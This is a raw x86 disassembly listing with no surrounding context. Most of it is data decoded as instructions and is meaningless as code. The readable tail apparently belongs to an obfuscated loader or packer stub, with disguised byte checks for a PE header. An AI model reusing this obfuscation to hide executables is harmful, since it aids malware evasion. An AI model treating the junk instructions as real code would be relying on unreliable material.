  40c4f3:	xchg   esp,eax
  40c4f4:	jmp    0xc5a62894
  40c4f9:	inc    ecx
  40c4fa:	add    al,0x76
  40c4fc:	xor    al,0xd2
  40c4fe:	ret    0x907b
  40c501:	fwait
  40c502:	(bad)  
  40c503:	call   0x9d10:0xaf8ff47b
  40c50a:	and    ebx,0x4d
  40c50d:	pop    ebp
  40c50e:	dec    ebp
  40c50f:	sub    ebp,ebp
  40c511:	in     eax,dx
  40c512:	jp     0x40c4d7
  40c514:	jle    0x40c504
  40c516:	jle    0x40c4a7
  40c518:	test   DWORD PTR [esi],eax
  40c51a:	aad    0xd3
  40c51c:	add    BYTE PTR [edx-0x34],0xdf
  40c520:	adc    cl,ah
  40c522:	popa   
  40c523:	inc    esp
  40c524:	mov    ch,0x7f
  40c526:	(bad)  
  40c527:	mov    edi,0x6ab466c1
  40c52c:	mov    edx,0xb2bbe097
  40c531:	in     eax,0xf1
  40c533:	iret   
  40c534:	xchg   edx,eax
  40c535:	lea    edx,[eax+ecx*8]
  40c538:	ds in  eax,dx
  40c53a:	mov    ah,0xe
  40c53c:	or     DWORD PTR [ebp-0x31],eax
  40c53f:	dec    eax
  40c540:	or     al,0xa8
  40c542:	lea    edx,[ebp-0x20]
  40c545:	lock push ebx
  40c547:	cmc    
  40c548:	out    dx,eax
  40c549:	aas    
  40c54a:	pop    eax
  40c54b:	fwait
  40c54c:	sti    
  40c54d:	ins    BYTE PTR es:[edi],dx
  40c54e:	pop    ebp
  40c54f:	mov    ds:0xa4b54c57,eax
  40c554:	aaa    
  40c555:	xchg   ecx,eax
  40c556:	lea    esp,[esi+0x7f]
  40c559:	inc    esp
  40c55a:	(bad)  
  40c55b:	mov    ebx,0x538f9c9d
  40c560:	retf   0xd43c
  40c563:	sub    BYTE PTR [eax+eax*4+0x6f],0x3d
  40c568:	push   edi
  40c569:	adc    eax,0xa51aa841
  40c56e:	ss jno 0x40c5ba
  40c571:	loopne 0x40c514
  40c573:	xchg   ebx,eax
  40c574:	aaa    
  40c575:	dec    esp
  40c576:	ss xchg ebp,eax
  40c578:	jp     0x40c563
  40c57a:	push   cs
  40c57b:	push   esi
  40c57c:	out    dx,al
  40c57d:	jle    0x40c59b
  40c57f:	shl    BYTE PTR [esi+eiz*2],cl
  40c582:	adc    BYTE PTR [esp+ebx*1],bl
  40c585:	jb     0x40c585
  40c587:	test   DWORD PTR [edi+0x6],ebx
  40c58a:	jb     0x40c60b
  40c58c:	shr    dl,0x4d
  40c58f:	cmc    
  40c590:	xchg   ebp,eax
  40c591:	xlat   BYTE PTR ds:[ebx]
  40c592:	and    BYTE PTR [eax+0x5],ch
  40c595:	mov    dl,0x91
  40c597:	pop    ss
  40c598:	mov    esi,0x40332544
  40c59d:	nop
  40c59e:	(bad)  
  40c59f:	in     al,dx
  40c5a0:	inc    esi
  40c5a1:	push   ecx
  40c5a2:	mov    dh,0x7c
  40c5a4:	mov    eax,0x42bb5a8f
  40c5a9:	loopne 0x40c5f1
  40c5ab:	and    DWORD PTR [edi-0x51cf536c],edi
  40c5b1:	sbb    BYTE PTR ds:0xf921e8e3,al
  40c5b7:	lock or esi,DWORD PTR [ebx-0x20]
  40c5bb:	and    cl,ch
  40c5bd:	ficom  DWORD PTR [esi]
  40c5bf:	cld    
  40c5c0:	fld1   
  40c5c2:	test   al,0x7a
  40c5c4:	std    
  40c5c5:	jo     0x40c562
  40c5c7:	sar    BYTE PTR [edi],0x8f
  40c5ca:	sti    
  40c5cb:	mov    ecx,0x54996091
  40c5d0:	inc    esp
  40c5d1:	aas    
  40c5d2:	hlt    
  40c5d3:	scas   al,BYTE PTR es:[edi]
  40c5d4:	popf   
  40c5d5:	cmc    
  40c5d6:	cmp    DWORD PTR [ebx-0x24],ebp
  40c5d9:	nop
  40c5da:	adc    al,0x9b
  40c5dc:	jle    0x40c563
  40c5de:	mov    dh,0xbc
  40c5e0:	popf   
  40c5e1:	in     al,dx
  40c5e2:	fmul   QWORD PTR [ecx+0x1c]
  40c5e5:	cmp    DWORD PTR [ebx+0x2386394],ebx
  40c5eb:	sbb    al,bl
  40c5ed:	inc    edi
  40c5ee:	cmp    dh,BYTE PTR [edx+0x1c]
  40c5f1:	sub    al,0x1d
  40c5f3:	daa    
  40c5f4:	js     0x40c61e
  40c5f6:	push   ss
  40c5f7:	in     eax,dx
  40c5f8:	inc    ecx
  40c5f9:	pop    ss
  40c5fa:	lods   al,BYTE PTR ds:[esi]
  40c5fb:	sbb    eax,0x5b4a5a6f
  40c600:	jg     0x40c66a
  40c602:	scas   al,BYTE PTR es:[edi]
  40c603:	xchg   BYTE PTR [edi+0x7079d4ad],bh
  40c609:	ins    DWORD PTR es:[edi],dx
  40c60a:	fdivr  QWORD PTR [ecx+0x39a5e9cd]
  40c610:	daa    
  40c611:	dec    esp
  40c612:	ret    0x69f5
  40c615:	cmp    DWORD PTR [edi-0x6a],edi
  40c618:	(bad)
  40c61c:	cld    
  40c61d:	mov    cl,0x4c
  40c61f:	hlt    
  40c620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c621:	(bad)  
  40c622:	jmp    0xe13d:0xc085c3a5
  40c629:	jmp    0xe50e:0x85404a4e
  40c630:	(bad)  
  40c631:	in     eax,dx
  40c632:	jbe    0x40c647
  40c634:	enter  0x7bfc,0xab
  40c638:	stc    
  40c639:	ss jb  0x40c652
  40c63c:	mov    ecx,0xab17847a
  40c641:	sbb    edx,ecx
  40c643:	cmp    eax,0x34f491b4
  40c648:	pop    edx
  40c649:	imul   ebx,DWORD PTR [edx],0x9
  40c64c:	lds    eax,FWORD PTR [ebx]
  40c64e:	jns    0x40c5e5
  40c650:	das    
  40c651:	jbe    0x40c68d
  40c653:	add    ebx,ecx
  40c655:	inc    ebx
  40c656:	(bad)  
  40c657:	hlt    
  40c658:	xchg   BYTE PTR [edi],cl
  40c65a:	aaa    
  40c65b:	cdq    
  40c65c:	jmp    0x2c62:0x521ef62f
  40c663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c664:	shl    DWORD PTR [esi],cl
  40c666:	jnp    0x40c6af
  40c668:	and    bl,dl
  40c66a:	dec    esp
  40c66b:	fs jl  0x40c6b4
  40c66e:	(bad)  
  40c66f:	pop    ss
  40c670:	es mov edi,0x59d541f4
  40c676:	mov    eax,ds:0x24aa2fe7
  40c67b:	xchg   ebp,eax
  40c67c:	mov    ecx,0xb7a43222
  40c681:	jne    0x40c669
  40c683:	jns    0x40c65e
  40c685:	shl    BYTE PTR [edx],1
  40c687:	stos   DWORD PTR es:[edi],eax
  40c688:	sub    bl,dl
  40c68a:	xchg   ecx,eax
  40c68b:	les    eax,FWORD PTR [ecx+0x1]
  40c68e:	(bad)  
  40c68f:	jns    0x40c61c
  40c691:	stc    
  40c692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c693:	xor    al,0x72
  40c695:	stos   DWORD PTR es:[edi],eax
  40c696:	inc    esi
  40c697:	out    0xf9,eax
  40c699:	(bad)  
  40c69a:	mov    ebp,0x66a59ac9
  40c69f:	jno    0x40c629
  40c6a1:	xchg   ebp,eax
  40c6a2:	dec    ebx
  40c6a3:	fbld   TBYTE PTR [edx-0x4d]
  40c6a6:	fcmovnbe st,st(2)
  40c6a8:	cmp    DWORD PTR [edx+ebp*4-0x3521396a],0xab98ea79
  40c6b3:	addr16 mov cl,0x9c
  40c6b6:	ins    DWORD PTR es:[edi],dx
  40c6b7:	pop    eax
  40c6b8:	ss sbb al,0x9c
  40c6bb:	mov    bh,0x81
  40c6bd:	imul   ecx,eax,0xec01ac7f
  40c6c3:	lea    edx,[edx-0x132be8c7]
  40c6c9:	jne    0x40c678
  40c6cb:	int3   
  40c6cc:	cdq    
  40c6cd:	dec    ebx
  40c6ce:	push   ds
  40c6cf:	push   es
  40c6d0:	ja     0x40c6fa
  40c6d2:	into   
  40c6d3:	ins    DWORD PTR es:[edi],dx
  40c6d4:	popf   
  40c6d5:	ds or  al,0x97
  40c6d8:	addr16 xor al,0x12
  40c6db:	dec    ebp
  40c6dc:	jno    0x40c682
  40c6de:	mov    ebx,0xe121d3c4
  40c6e3:	imul   esp,DWORD PTR [ebp+0x282ace9b],0x61d32817
  40c6ed:	ins    DWORD PTR es:[edi],dx
  40c6ee:	pop    ds
  40c6ef:	jl     0x40c6c6
  40c6f1:	jno    0x40c741
  40c6f3:	xor    eax,0x64b9bff3
  40c6f8:	cmp    DWORD PTR [ebp+0x2ef83796],ecx
  40c6fe:	pop    ecx
  40c6ff:	sub    BYTE PTR [ecx+eiz*2],ah
  40c702:	dec    edx
  40c703:	outs   dx,DWORD PTR ds:[esi]
  40c704:	mov    edi,0xb15d2263
  40c709:	sub    eax,0x36662f71
  40c70e:	retf   
  40c70f:	ret    0xca19
  40c712:	clc    
  40c713:	out    0x28,al
  40c715:	stc    
  40c716:	cli    
  40c717:	sbb    BYTE PTR [ebp-0x11],bl
  40c71a:	cwde   
  40c71b:	pop    edx
  40c71c:	or     ah,bh
  40c71e:	sub    cl,BYTE PTR [ebp-0x40]
  40c721:	frstor [ebx+eiz*1]
  40c724:	repnz test al,0x39
  40c727:	imul   ebp,DWORD PTR [ecx],0x53
  40c72a:	cmp    ah,BYTE PTR [edi]
  40c72c:	adc    ebp,DWORD PTR ds:0x45e8adaf
  40c732:	(bad)  
  40c733:	popf   
  40c734:	jp     0x40c6d3
  40c736:	cmp    eax,0xb6710d13
  40c73b:	jmp    0x40c77c
  40c73d:	jge    0x40c6ce
  40c73f:	rcl    ebx,1
  40c741:	out    0xf3,eax
  40c743:	push   edx
  40c744:	loopne 0x40c780
  40c746:	adc    DWORD PTR [ebp+0x5da550fd],esi
  40c74c:	jae    0x40c71c
  40c74e:	mov    dl,0x2f
  40c750:	in     eax,0x21
  40c752:	adc    eax,0x3fe71733
  40c757:	add    dl,BYTE PTR [edx-0x3d43c53e]
  40c75d:	cmp    eax,0x23e013f9
  40c763:	daa    
  40c764:	mov    eax,ds:0x65ee8598
  40c769:	repz ss mov bl,0x7d
  40c76d:	sbb    dh,BYTE PTR ds:0xdeac222d
  40c773:	pushf  
  40c774:	(bad)  
  40c775:	jns    0x40c6fb
  40c777:	ins    BYTE PTR es:[edi],dx
  40c778:	jmp    0x3d27f266
  40c77d:	xchg   esi,eax
  40c77e:	push   ecx
  40c77f:	push   esp
  40c780:	jns    0x40c7dd
  40c782:	cmp    al,0x60
  40c784:	stc    
  40c785:	test   DWORD PTR [ecx+0x6d],esi
  40c788:	(bad)  
  40c789:	xor    eax,0xf47233f1
  40c78e:	cmp    bh,BYTE PTR [esi+eax*8+0x42]
  40c792:	mov    cl,0x54
  40c794:	gs push ebp
  40c796:	aam    0x7
  40c798:	std    
  40c799:	in     al,0xe
  40c79b:	or     al,0x6c
  40c79d:	sub    BYTE PTR [esi-0x3c],al
  40c7a0:	xor    BYTE PTR [eax],bl
  40c7a2:	pop    esi
  40c7a3:	xor    eax,0x1aee44b6
  40c7a8:	test   ebp,0x9e59727c
  40c7ae:	and    al,0xb4
  40c7b0:	stos   BYTE PTR es:[edi],al
  40c7b1:	xlat   BYTE PTR ds:[ebx]
  40c7b2:	dec    esi
  40c7b3:	cmp    al,0x4e
  40c7b5:	mov    ah,0xb8
  40c7b7:	push   ss
  40c7b8:	jbe    0x40c7c9
  40c7ba:	sub    eax,DWORD PTR [ecx+0x8]
  40c7bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7be:	repnz dec ebx
  40c7c0:	fs push esp
  40c7c2:	ins    BYTE PTR es:[edi],dx
  40c7c3:	lds    eax,FWORD PTR [esp+ebp*4]
  40c7c6:	mov    edi,0xa6caf516
  40c7cb:	ret    
  40c7cc:	pop    ecx
  40c7cd:	or     al,0x33
  40c7cf:	aaa    
  40c7d0:	xchg   ebp,eax
  40c7d1:	enter  0xfd28,0xac
  40c7d5:	outs   dx,BYTE PTR ds:[esi]
  40c7d6:	mov    ecx,DWORD PTR [ebp-0x8]
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	and    al,0x2d
  40c801:	fptan  
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c7c3
  40c80c:	adc    BYTE PTR [esi+0x2d9bc586],dl
  40c812:	jmp    0xf1961fca
  40c817:	jne    0x40c85e
  40c819:	mov    dl,0x51
  40c81b:	fisttp DWORD PTR [esi-0x7c]
  40c81e:	hlt    
  40c81f:	mov    ebx,eax
  40c821:	aam    0x3b
  40c823:	cdq    
  40c824:	mov    edi,ss
  40c826:	cmp    BYTE PTR [ebx+0x22],0xe0
  40c82a:	push   cs
  40c82b:	fwait
  40c82c:	adc    ebp,ebp
  40c82e:	retf   0xff34
  40c831:	bound  eax,QWORD PTR [edx+0x18]
  40c834:	popa   
  40c835:	sbb    esi,0x73f75002
  40c83b:	xchg   edx,eax
  40c83c:	sbb    dh,BYTE PTR [ecx-0x118f4646]
  40c842:	and    ch,BYTE PTR [eax+0x73]
  40c845:	shl    BYTE PTR [edx],0x16
  40c848:	pop    edi
  40c849:	data16 or bl,al
  40c84c:	and    DWORD PTR [ebx],ebx
  40c84e:	jae    0x40c7ff
  40c850:	lods   al,BYTE PTR ds:[esi]
  40c851:	or     al,0x8f
  40c853:	out    dx,al
  40c854:	stc    
  40c855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c856:	cs mov edi,0x6fe11a16
  40c85c:	cmp    BYTE PTR [ecx],dh
  40c85e:	mov    bl,dl
  40c860:	leave  
  40c861:	je     0x40c843
  40c863:	test   ah,0x8f
  40c866:	jns    0x40c7fe
  40c868:	aad    0xd4
  40c86a:	shl    DWORD PTR [esi],0xaf
  40c86d:	pop    esi
  40c86e:	mov    eax,0x6d8a8ccc
  40c873:	sub    edi,esi
  40c875:	mov    bh,0x74
  40c877:	mov    ds:0x43d7c873,al
  40c87c:	adc    eax,0xc34b928b
  40c881:	add    BYTE PTR [eiz*4+0x483abcf9],ch
  40c888:	mov    ch,0xc2
  40c88a:	jp     0x40c823
  40c88c:	imul   ecx,ecx,0x1e5da21c
  40c892:	adc    dl,al
  40c894:	addr16 mov ebx,0x2aef09e3
  40c89a:	mov    esp,0x78730ed4
  40c89f:	ror    BYTE PTR [ecx+0x275aa866],cl
  40c8a5:	out    0xbd,eax
  40c8a7:	and    DWORD PTR [ecx+0x7f],0x8b44420f
  40c8ae:	out    0xd9,al
  40c8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8b1:	xchg   ebp,eax
  40c8b2:	sub    eax,0x43d25196
  40c8b7:	idiv   DWORD PTR [ecx+0x49]
  40c8ba:	push   esi
  40c8bb:	inc    ebp
  40c8bc:	shr    BYTE PTR ds:0xf63428,1
  40c8c2:	aas    
  40c8c3:	mov    eax,0x5c1e094b
  40c8c8:	or     ecx,DWORD PTR [edx-0x6f]
  40c8cb:	mov    ebp,0xa146d792
  40c8d0:	jle    0x40c868
  40c8d2:	adc    al,0xc3
  40c8d4:	mov    eax,DWORD PTR [esi]
  40c8d6:	mov    edx,0x40aaf7e0
  40c8db:	xchg   dl,ch
  40c8dd:	lods   al,BYTE PTR ds:[esi]
  40c8de:	push   ebx
  40c8df:	or     edx,ecx
  40c8e1:	mov    ds:0x102ad691,eax
  40c8e6:	scas   al,BYTE PTR es:[edi]
  40c8e7:	push   ecx
  40c8e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e9:	mov    edx,0x717d8c2c
  40c8ee:	lea    esp,[ecx+edx*1+0x23]
  40c8f2:	aaa    
  40c8f3:	push   ecx
  40c8f4:	ret    
  40c8f5:	pop    es
  40c8f6:	mov    esp,0x37840a74
  40c8fb:	or     cl,BYTE PTR [edi+0x5c]
  40c8fe:	inc    edx
  40c8ff:	add    eax,0x1dd2f69b
  40c904:	rol    al,cl
  40c906:	mov    esp,0x5e7a158c
  40c90b:	adc    DWORD PTR [esi],0xa00e02cd
  40c911:	cld    
  40c912:	adc    eax,0x7d698bd7
  40c917:	ret    0x2d7c
  40c91a:	sti    
  40c91b:	add    dh,dl
  40c91d:	out    dx,al
  40c91e:	mov    eax,ds:0x9aefd8ba
  40c923:	mov    ds:0xa0c7fc42,eax
  40c928:	push   ecx
  40c929:	xchg   esp,eax
  40c92a:	pusha  
  40c92b:	js     0x40c94a
  40c92d:	bswap  esi
  40c92f:	ret    0x732c
  40c932:	and    ebx,DWORD PTR [edi]
  40c934:	sahf   
  40c935:	mov    bh,0xb4
  40c937:	jecxz  0x40c938
  40c939:	mov    edi,0xf92abc5c
  40c93e:	push   es
  40c93f:	xor    ch,cl
  40c941:	ins    DWORD PTR es:[edi],dx
  40c942:	jnp    0x40c97a
  40c944:	cmp    al,bl
  40c946:	imul   DWORD PTR [ebp+0x4e83d629]
  40c94c:	ret    
  40c94d:	(bad)  
  40c94e:	fstp   DWORD PTR [edx-0x4c]
  40c951:	retf   
  40c952:	rcr    BYTE PTR [edx],cl
  40c954:	dec    ebx
  40c955:	cmp    DWORD PTR [ecx-0x44],esp
  40c958:	dec    esp
  40c959:	fisttp DWORD PTR [edx-0x79682c59]
  40c95f:	repnz arpl WORD PTR [ecx+ebx*4],si
  40c963:	xchg   edi,eax
  40c964:	push   cs
  40c965:	fist   WORD PTR [ebx-0x65]
  40c968:	mov    edi,0x8284c6a0
  40c96d:	inc    esi
  40c96e:	stos   BYTE PTR es:[edi],al
  40c96f:	inc    ecx
  40c970:	sar    DWORD PTR [ebx],0xf9
  40c973:	push   ecx
  40c974:	repz rcr DWORD PTR [edx],1
  40c977:	std    
  40c978:	mov    BYTE PTR [edi-0x21],ah
  40c97b:	mov    ebx,0x3a022982
  40c980:	lods   al,BYTE PTR ds:[esi]
  40c981:	mov    bl,0xcd
  40c983:	ins    BYTE PTR es:[edi],dx
  40c984:	or     al,0xda
  40c986:	jno    0xc3073db1
  40c98c:	aam    0x69
  40c98e:	push   ecx
  40c98f:	shl    BYTE PTR [edi],1
  40c991:	shl    edx,1
  40c993:	clc    
  40c994:	js     0x40c93d
  40c996:	or     DWORD PTR [ebp-0x57ef09b3],ecx
  40c99c:	jno    0x40c97b
  40c99e:	xchg   ebp,eax
  40c99f:	outs   dx,BYTE PTR ds:[esi]
  40c9a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9a1:	mov    eax,ebp
  40c9a3:	dec    esi
  40c9a4:	xor    ebx,eax
  40c9a6:	mov    DWORD PTR [esi+0x7],ebx
  40c9a9:	pop    ss
  40c9aa:	pop    edi
  40c9ab:	sar    dh,1
  40c9ad:	add    al,0x6
  40c9af:	(bad)  
  40c9b0:	xchg   BYTE PTR [esi+0x32],ch
  40c9b3:	mov    esi,0x872d4891
  40c9b8:	ds inc edi
  40c9ba:	mov    ebp,0xc8386f48
  40c9bf:	(bad)  
  40c9c0:	push   ebx
  40c9c1:	das    
  40c9c2:	and    DWORD PTR [ebp+0x288eb6e0],0xffffff87
  40c9c9:	out    0xf0,al
  40c9cb:	jns    0x40ca11
  40c9cd:	pop    eax
  40c9ce:	pop    ebx
  40c9cf:	in     al,0x60
  40c9d1:	cdq    
  40c9d2:	dec    eax
  40c9d3:	or     ecx,DWORD PTR [edx+0x4ae4f10c]
  40c9d9:	jecxz  0x40ca14
  40c9db:	mov    bl,0xfc
  40c9dd:	cmp    ch,BYTE PTR [eax]
  40c9df:	mov    eax,ds:0xfb8940d9
  40c9e4:	mov    cl,0x9
  40c9e6:	xchg   ebp,eax
  40c9e7:	aam    0xa2
  40c9e9:	push   esp
  40c9ea:	repnz sbb ch,dh
  40c9ed:	pop    ecx
  40c9ee:	fldpi  
  40c9f0:	pop    esi
  40c9f1:	fdivr  st(6),st
  40c9f3:	clc    
  40c9f4:	adc    al,0x4
  40c9f6:	jle    0x40c9f6
  40c9f8:	mov    edx,0x288f3d43
  40c9fd:	mov    DWORD PTR [ebx-0x2dd490a5],eax
  40ca03:	arpl   WORD PTR [edx],sp
  40ca05:	in     eax,0x72
  40ca07:	and    eax,0x84a09c20
  40ca0c:	pop    ebp
  40ca0d:	std    
  40ca0e:	xchg   ebp,eax
  40ca0f:	pusha  
  40ca10:	pop    es
  40ca11:	data16 mov ch,0x4d
  40ca14:	int3   
  40ca15:	(bad)  
  40ca16:	mov    BYTE PTR [edi],bh
  40ca18:	mov    al,0xa3
  40ca1a:	jp     0x40ca61
  40ca1c:	adc    eax,0xb1aa773
  40ca21:	arpl   WORD PTR [ecx-0x3db1c423],dx
  40ca27:	mov    al,ds:0xf1d313c8
  40ca2c:	enter  0x3297,0x66
  40ca30:	iret   
  40ca31:	faddp  st(7),st
  40ca33:	pop    ebp
  40ca34:	xor    DWORD PTR [esi],ebp
  40ca36:	jge    0x40ca34
  40ca38:	sub    al,0x26
  40ca3a:	call   0x83e0:0xe4a8cda7
  40ca41:	ins    DWORD PTR es:[edi],dx
  40ca42:	cmp    bl,BYTE PTR [ebx]
  40ca44:	sbb    al,0xc9
  40ca46:	add    BYTE PTR [ecx],dh
  40ca48:	sub    eax,0x6aa8076b
  40ca4d:	lods   eax,DWORD PTR ds:[esi]
  40ca4e:	jle    0x40cab6
  40ca50:	mov    al,0xf0
  40ca52:	(bad)  [edi+0x6a]
  40ca55:	(bad)  
  40ca56:	daa    
  40ca57:	popf   
  40ca58:	aas    
  40ca59:	push   ebx
  40ca5a:	inc    ecx
  40ca5b:	popf   
  40ca5c:	shl    DWORD PTR [esi-0xb],0xe
  40ca60:	mov    cl,0xd7
  40ca62:	inc    edi
  40ca63:	mov    BYTE PTR [edi+0x4107615f],dl
  40ca69:	fcomi  st,st(7)
  40ca6b:	mov    ebp,?
  40ca6d:	sbb    DWORD PTR [esi-0x4e],esi
  40ca70:	shr    DWORD PTR [esi+esi*8+0x46],0x67
  40ca75:	scas   eax,DWORD PTR es:[edi]
  40ca76:	xchg   esp,eax
  40ca77:	lock and BYTE PTR [ebp+0x643d5d31],0x3b
  40ca7f:	fld    QWORD PTR [ecx]
  40ca81:	idiv   BYTE PTR [ecx+0x5b]
  40ca84:	xchg   ch,ah
  40ca86:	fistp  WORD PTR [ebx-0x30598943]
  40ca8c:	pop    esp
  40ca8d:	or     bh,bl
  40ca8f:	cmc    
  40ca90:	ins    DWORD PTR es:[edi],dx
  40ca91:	jo     0x40ca92
  40ca93:	dec    ebx
  40ca94:	cmc    
  40ca95:	adc    al,0x95
  40ca97:	sar    ecx,1
  40ca99:	push   esp
  40ca9a:	cmovnp edi,ebp
  40ca9d:	or     DWORD PTR [ebp+0x57a27fd7],ebx
  40caa3:	mov    ecx,cs
  40caa5:	lahf   
  40caa6:	test   al,0xc6
  40caa8:	aam    0xe5
  40caaa:	fdivr  st,st(4)
  40caac:	mov    eax,0x313176d3
  40cab1:	(bad)  
  40cab2:	jnp    0x40cab3
  40cab4:	sub    BYTE PTR [edx],al
  40cab6:	(bad)  
  40cab8:	js     0x40ca61
  40caba:	cmp    BYTE PTR [edx-0x1f695e31],0x80
  40cac1:	push   ds
  40cac2:	data16 sbb al,BYTE PTR ds:0x5e47fadf
  40cac9:	popa   
  40caca:	popa   
  40cacb:	sbb    esp,DWORD PTR [edi]
  40cacd:	(bad)  
  40cace:	mov    ecx,0xd8a93a59
  40cad3:	sbb    BYTE PTR [ebx-0x57733304],dh
  40cad9:	hlt    
  40cada:	setne  BYTE PTR [ecx+0x57030a5b]
  40cae1:	add    al,0x3d
  40cae3:	dec    ebp
  40cae4:	xchg   BYTE PTR [eax],dh
  40cae6:	imul   edi,DWORD PTR [ebx],0x4c570bdb
  40caec:	push   edi
  40caed:	jecxz  0x40cb1d
  40caef:	arpl   WORD PTR [ebp+0x40],si
  40caf2:	push   0xffffffe0
  40caf4:	mov    eax,ds:0x2a4e6260
  40caf9:	xor    eax,0xfa499a5f
  40cafe:	cld    
  40caff:	dec    edi
  40cb00:	aaa    
  40cb01:	icebp  
  40cb02:	mov    dh,0xa6
  40cb04:	jg     0x40cb5e
  40cb06:	cmp    al,0x16
  40cb08:	push   ds
  40cb09:	les    esp,FWORD PTR [eax+0xa6db0f0]
  40cb0f:	or     bl,BYTE PTR [eax+0x75]
  40cb12:	pusha  
  40cb13:	add    BYTE PTR [ecx+eiz*2],al
  40cb16:	cld    
  40cb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb18:	shr    ebx,cl
  40cb1a:	pushfw 
  40cb1c:	fild   DWORD PTR [ebp-0x5a]
  40cb1f:	out    0xba,al
  40cb21:	or     eax,0xb6decee3
  40cb26:	cmp    dl,bh
  40cb28:	mov    cl,0x83
  40cb2a:	dec    esp
  40cb2b:	pop    es
  40cb2c:	pop    eax
  40cb2d:	xor    cl,BYTE PTR [esi-0x20]
  40cb30:	repnz stc 
  40cb32:	popf   
  40cb33:	nop
  40cb34:	stc    
  40cb35:	mov    ds:0x80e32a2c,al
  40cb3a:	cmp    al,0x8b
  40cb3c:	dec    ebp
  40cb3d:	loopne 0x40cb72
  40cb3f:	mov    BYTE PTR [ebx],0xc7
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x430455,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x430455
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x430455,eax
  40cbe0:	cmp    DWORD PTR ds:0x430455,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x430455,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42ea0b
  40cc05:	cmp    DWORD PTR ds:0x430455,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x430455
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x430455,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x43043d,0x0
  40cc2f:	mov    eax,ds:0x43043d
  40cc34:	inc    eax
  40cc35:	mov    ds:0x43043d,eax
  40cc3a:	cmp    DWORD PTR ds:0x43043d,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e917
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42eacb
  40cc6b:	cmp    DWORD PTR ds:0x43043d,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
